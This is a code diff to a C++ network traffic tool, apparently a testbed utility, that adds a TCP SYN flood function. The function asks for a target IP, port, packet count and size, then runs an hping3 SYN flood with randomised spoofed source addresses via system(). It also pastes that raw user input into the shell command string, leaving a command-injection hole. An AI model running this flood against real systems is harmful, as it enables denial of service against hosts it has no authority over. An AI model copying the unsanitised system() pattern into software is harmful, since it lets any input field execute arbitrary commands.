@@ -33,6 +33,9 @@ void inputBlockTrafficParameters(string &ip,string &port);
 void blockTraffic(const string ip,const string port);
 void unblockTraffic(const string ip, const string port);
 
+// TCP flood options
+void tcpSynFloodAttack(void);
+
 int main(int argv,char *argc[])
 {
    
@@ -112,6 +115,7 @@ void processInput(int inputOption)
           break;
        case SYNFLOOD:
           print("SYN FLOOD TRAFFIC"<<endl);
+          tcpSynFloodAttack();
           break;
        case RST:
           print("RST TRAFFIC"<<endl);
@@ -157,4 +161,28 @@ void unblockTraffic(const string ip,const string port)
     system(commandStr.c_str());
     print("The Current firewall rules are as below. "<<endl);
     system("iptables -L -n");
+}
+void tcpSynFloodAttack(void)
+{
+   string packetCount="",packetSize="",port="",targetIP="";
+   print("Input the number of packets to send :: ");
+   getline(cin,packetCount);
+   print("Input the size of each packet to send :: ");
+   getline(cin,packetSize); 
+   print("Input the ip of the target Master :: ");
+   getline(cin,targetIP); 
+   print("Input the port of the target Master :: ");
+   getline(cin,port); 
+   string commandStr= "hping3 -c " + packetCount + 
+                      " -d " + packetSize +
+                      " -S -w 64 -p " + port +
+                      " --flood --rand-source " + targetIP;
+
+   string commandStrWithoutFlood= "hping3 -c " + packetCount + 
+                      " -d " + packetSize +
+                      " -S -w 64 -i u10000 -p " + port +
+                      " --rand-source " + targetIP;
+  print(commandStrWithoutFlood<<endl);
+  system(commandStrWithoutFlood.c_str());
+                      
 }
